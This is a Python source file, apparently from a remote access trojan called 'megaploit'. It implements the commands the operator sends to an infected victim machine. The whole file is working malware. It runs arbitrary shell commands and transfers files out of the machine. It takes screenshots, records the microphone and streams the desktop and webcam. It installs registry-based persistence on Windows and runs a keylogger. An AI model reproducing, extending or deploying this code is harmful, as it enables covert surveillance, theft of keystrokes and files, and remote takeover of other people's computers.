"""
megaploit.agent.handlers
~~~~~~~~~~~~~~~~~~~~~~~~
All command implementations executed on the victim/agent side.
Each handler receives the split arg list and returns a response string,
or None if it already sent binary data directly over the socket.
"""

from __future__ import annotations

import getpass
import os
import platform
import shutil
import subprocess
import sys
import threading
import wave

from megaploit.core.protocol import send_file as _send_file
from megaploit.core.config import MAX_RECORD_SECONDS
from megaploit.agent.keylogger import Keylogger

# Optional dependencies
try:
    import pyautogui
    _HAS_GUI = True
except ImportError:
    _HAS_GUI = False

try:
    import pyaudio
    _HAS_AUDIO = True
except ImportError:
    _HAS_AUDIO = False


# ---------------------------------------------------------------------------
# Module-level state (keylogger, web servers)
# ---------------------------------------------------------------------------

_keylog: Keylogger | None = None
_keylog_thread: threading.Thread | None = None

_web_thread: threading.Thread | None = None
_web_app = None


# ---------------------------------------------------------------------------
# Command router
# ---------------------------------------------------------------------------

# Maps command name → handler function
_HANDLERS: dict[str, object] = {}

def _register(name: str):
    def decorator(fn):
        _HANDLERS[name] = fn
        return fn
    return decorator


def handle(conn, cmd: str) -> str | None:
    """
    Parse *cmd*, find and call the matching handler.
    Returns a string response, or None if binary data was already sent.
    """
    parts = cmd.strip().split(maxsplit=1)
    if not parts:
        return ""
    name = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""
    args = rest.split() if rest else []

    fn = _HANDLERS.get(name)
    if fn:
        return fn(conn, args)
    # Fall through to shell execution
    return _shell_exec(cmd)


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------

@_register("cd")
def _cd(conn, args: list[str]) -> str:
    if len(args) != 1:
        return "Usage: cd <directory>"
    try:
        os.chdir(args[0])
        return f"[+] cwd: {os.getcwd()}"
    except FileNotFoundError:
        return f"[-] Not found: {args[0]}"
    except PermissionError:
        return f"[-] Permission denied: {args[0]}"


@_register("sysinfo")
def _sysinfo(conn, args: list[str]) -> str:
    res = str(pyautogui.size()) if _HAS_GUI else "unknown"
    return (
        f"[*] System Information\n"
        f"    OS:           {platform.system()} {platform.release()} ({platform.version()})\n"
        f"    Hostname:     {platform.node()}\n"
        f"    Username:     {getpass.getuser()}\n"
        f"    Architecture: {platform.machine()}\n"
        f"    Python:       {sys.version.split()[0]}\n"
        f"    Resolution:   {res}\n"
        f"    CWD:          {os.getcwd()}"
    )


@_register("upload")
def _upload(conn, args: list[str]) -> str:
    """Server is *uploading* a file TO us — we receive it."""
    from megaploit.core.protocol import recv_file as _recv_file
    if len(args) != 1:
        return "Usage: upload <filename>"
    try:
        _recv_file(conn, args[0], timeout=60)
        return f"[+] Received: {args[0]}"
    except Exception as e:
        return f"[-] Receive failed: {e}"


@_register("download")
def _download(conn, args: list[str]) -> str | None:
    """Server wants to DOWNLOAD a file FROM us — we send it."""
    if len(args) != 1:
        return "Usage: download <filename>"
    path = args[0]
    if not os.path.isfile(path):
        return f"[-] File not found: {path}"
    _send_file(conn, path)
    return None  # data already sent


@_register("screenshot")
def _screenshot(conn, args: list[str]) -> str | None:
    if not _HAS_GUI:
        return "[-] pyautogui not available"
    try:
        fname = "_screenshot.png"
        pyautogui.screenshot(fname)
        _send_file(conn, fname)
        os.remove(fname)
        return None
    except Exception as e:
        return f"[-] Screenshot failed: {e}"


@_register("record")
def _record(conn, args: list[str]) -> str | None:
    if not _HAS_AUDIO:
        return "[-] pyaudio not available"
    if len(args) != 1 or not args[0].isdigit():
        return "Usage: record <seconds>"
    seconds = min(int(args[0]), MAX_RECORD_SECONDS)
    try:
        fname = "_recording.wav"
        _do_record(fname, seconds)
        _send_file(conn, fname)
        os.remove(fname)
        return None
    except Exception as e:
        return f"[-] Recording failed: {e}"


def _do_record(path: str, seconds: int) -> None:
    p = pyaudio.PyAudio()
    chunk = 1024
    fmt = pyaudio.paInt16
    channels = 1
    rate = 44100
    stream = p.open(format=fmt, channels=channels, rate=rate,
                    input=True, frames_per_buffer=chunk)
    frames = [stream.read(chunk) for _ in range(int(rate / chunk * seconds))]
    stream.stop_stream()
    stream.close()
    p.terminate()
    with wave.open(path, "wb") as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(fmt))
        wf.setframerate(rate)
        wf.writeframes(b"".join(frames))


@_register("screen_stream")
def _screen_stream(conn, args: list[str]) -> str:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return "Usage: screen_stream <on|off>"
    if args[0] == "on":
        return _start_web("megaploit.streaming.desktop", 5000)
    return _stop_web()


@_register("webcam")
def _webcam(conn, args: list[str]) -> str:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return "Usage: webcam <on|off>"
    if args[0] == "on":
        return _start_web("megaploit.streaming.webcam", 5001)
    return _stop_web()


def _start_web(module_name: str, port: int) -> str:
    global _web_thread, _web_app
    if _web_thread and _web_thread.is_alive():
        return "[-] A web server is already running"
    try:
        import importlib
        mod = importlib.import_module(module_name)
        _web_app = mod.app

        def _run():
            mod.app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

        _web_thread = threading.Thread(target=_run, daemon=True)
        _web_thread.start()
        return f"http://0.0.0.0:{port}"
    except Exception as e:
        return f"[-] Failed: {e}"


def _stop_web() -> str:
    global _web_app
    if _web_app is None:
        return "[-] No web server running"
    _web_app = None
    return "[+] Stopped (daemon thread will terminate)"


@_register("persist")
def _persist(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] Persistence is Windows-only"
    if len(args) != 2:
        return "Usage: persist <regname> <filename>"
    reg_name, copy_name = args[0], args[1]
    try:
        dst = os.path.join(os.environ["APPDATA"], copy_name)
        if not os.path.exists(dst):
            shutil.copyfile(sys.executable, dst)
            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v {reg_name} /t REG_SZ /d "{dst}"',
                shell=True,
            )
            return "[+] Persistence installed"
        return "[-] Already exists"
    except Exception as e:
        return f"[-] Error: {e}"


@_register("keylog_start")
def _keylog_start(conn, args: list[str]) -> str:
    global _keylog, _keylog_thread
    if _keylog is not None:
        return "[-] Keylogger already running"
    _keylog = Keylogger()
    _keylog_thread = threading.Thread(target=_keylog.start, daemon=True)
    _keylog_thread.start()
    return "[+] Keylogger started"


@_register("keylog_dump")
def _keylog_dump(conn, args: list[str]) -> str:
    if _keylog is None:
        return "[-] Keylogger not running"
    data = _keylog.read_logs()
    return data if data else "(empty)"


@_register("keylog_stop")
def _keylog_stop(conn, args: list[str]) -> str:
    global _keylog, _keylog_thread
    if _keylog is None:
        return "[-] Keylogger not running"
    _keylog.destroy()
    if _keylog_thread:
        _keylog_thread.join(timeout=5)
    _keylog = None
    _keylog_thread = None
    return "[+] Keylogger stopped and log deleted"


@_register("forkbomb")
def _forkbomb(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return "[-] forkbomb not supported on Windows"
    os.fork()
    return "[-] forkbomb triggered"


# ---------------------------------------------------------------------------
# Generic shell fallback
# ---------------------------------------------------------------------------

def _shell_exec(cmd: str) -> str:
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
        )
        stdout, stderr = proc.communicate(timeout=60)
        out = stdout.decode(errors="replace") + stderr.decode(errors="replace")
        return out.strip() if out.strip() else "(no output)"
    except subprocess.TimeoutExpired:
        proc.kill()
        return "[-] Command timed out (60s)"
    except Exception as e:
        return f"[-] Command failed: {e}"
